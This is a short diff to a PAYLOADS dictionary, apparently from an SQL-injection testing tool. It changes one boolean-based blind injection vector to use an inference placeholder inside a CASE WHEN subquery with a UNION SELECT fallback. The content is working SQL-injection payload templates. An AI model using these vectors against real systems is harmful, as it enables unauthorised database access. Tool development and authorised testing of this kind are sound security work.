@@ -287,7 +287,7 @@ PAYLOADS = {
                     # {"pref": "NULL OR 06387=", "suf": "-- wXyW"},
                 ],
                 "title": "Boolean-based blind - Parameter replace (original value)",
-                "vector": "(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN [ORIGVALUE] ELSE (SELECT 09567 UNION SELECT 08652) END))",
+                "vector": "(SELECT (CASE WHEN ([INFERENCE]) THEN [ORIGVALUE] ELSE (SELECT 09567 UNION SELECT 08652) END))",
                 "dbms": "",
             },
             {
